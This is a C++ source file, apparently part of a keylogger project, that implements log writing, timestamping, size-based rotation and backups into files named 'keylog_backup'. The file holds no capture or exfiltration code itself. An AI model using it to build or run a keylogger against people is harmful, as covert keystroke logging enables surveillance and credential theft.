// ============================================================================
// FileManager.cpp - Implementação completa
// ============================================================================
#include "../include/FileManager.h"
#include "Utils.h"
#include <iostream>
#include <sstream>
#include <filesystem>
#include <iomanip>
#include <mutex>
#include <thread>


FileManager::FileManager(const std::string& path)
    : outputPath(path), maxFileSize(10 * 1024 * 1024), rotationCount(0), encryptionEnabled(false) {
    backupPath = "logs/backup/";

    // Criar diretórios se não existirem
    std::filesystem::create_directories("logs");
    std::filesystem::create_directories(backupPath);
}

FileManager::~FileManager() {
    // Cleanup se necessário
}

bool FileManager::writeToFile(const std::string& data, bool append) {
    std::lock_guard<std::mutex> lock(fileMutex);

    try {
        std::ios::openmode mode = append ? (std::ios::out | std::ios::app) : std::ios::out;
        std::ofstream file(outputPath, mode);

        if (!file.is_open()) {
            std::cerr << "Erro: Não foi possível abrir " << outputPath << std::endl;
            return false;
        }

        file << data;
        file.flush();

        // Verificar se arquivo ficou muito grande
        if (isFileTooLarge()) {
            rotateFiles();
        }

        return true;
    } catch (const std::exception& e) {
        std::cerr << "Erro ao escrever arquivo: " << e.what() << std::endl;
        return false;
    }
}

bool FileManager::writeWithTimestamp(const std::string& data) {
    std::string timestampedData = "[" + getCurrentTimestamp() + "] " + data + "\n";
    return writeToFile(timestampedData, true);
}

std::string FileManager::readFile() {
    std::lock_guard<std::mutex> lock(fileMutex);

    std::ifstream file(outputPath);
    if (!file.is_open()) {
        return "";
    }

    std::string content;
    std::string line;
    while (std::getline(file, line)) {
        content += line + "\n";
    }

    return content;
}

void FileManager::clearFile() {
    std::lock_guard<std::mutex> lock(fileMutex);

    // Fazer backup antes de limpar
    createBackup();

    std::ofstream file(outputPath, std::ios::trunc);
    if (file.is_open()) {
        file.close();
        writeWithTimestamp("=== ARQUIVO LIMPO ===");
    }
}

void FileManager::rotateFiles() {
    try {
        // Criar nome do backup
        std::string backupName = backupPath + "keylog_backup_" +
                                std::to_string(++rotationCount) + ".txt";

        // Mover arquivo atual para backup
        std::filesystem::copy_file(outputPath, backupName);

        // Limpar arquivo atual
        std::ofstream file(outputPath, std::ios::trunc);
        file.close();

        writeWithTimestamp("=== ARQUIVO ROTACIONADO ===");

        std::cout << "Arquivo rotacionado para: " << backupName << std::endl;

    } catch (const std::exception& e) {
        std::cerr << "Erro na rotação: " << e.what() << std::endl;
    }
}

void FileManager::createBackup() {
    if (!fileExists()) return;

    try {
        std::string backupName = backupPath + "manual_backup_" +
                                getCurrentTimestamp() + ".txt";

        // Substituir caracteres inválidos no nome do arquivo
        std::replace(backupName.begin(), backupName.end(), ':', '-');
        std::replace(backupName.begin(), backupName.end(), ' ', '_');

        std::filesystem::copy_file(outputPath, backupName);

    } catch (const std::exception& e) {
        std::cerr << "Erro no backup: " << e.what() << std::endl;
    }
}

bool FileManager::isFileTooLarge() {
    try {
        if (std::filesystem::exists(outputPath)) {
            return std::filesystem::file_size(outputPath) > maxFileSize;
        }
    } catch (const std::exception&) {
        return false;
    }
    return false;
}

std::string FileManager::getCurrentTimestamp() {
    auto now = std::chrono::system_clock::now();
    auto time_t = std::chrono::system_clock::to_time_t(now);
    auto tm = *std::localtime(&time_t);

    std::stringstream ss;
    ss << std::put_time(&tm, "%Y-%m-%d %H:%M:%S");
    return ss.str();
}

bool FileManager::fileExists() const {
    return std::filesystem::exists(outputPath);
}

size_t FileManager::getFileSize() const {
    try {
        if (fileExists()) {
            return std::filesystem::file_size(outputPath);
        }
    } catch (const std::exception&) {
        return 0;
    }
    return 0;
}

std::vector<std::string> FileManager::getLogHistory() const {
    std::vector<std::string> history;

    try {
        for (const auto& entry : std::filesystem::directory_iterator(backupPath)) {
            if (entry.is_regular_file()) {
                history.push_back(entry.path().filename().string());
            }
        }
    } catch (const std::exception&) {
        // Diretório não existe ou erro de acesso
    }

    return history;
}
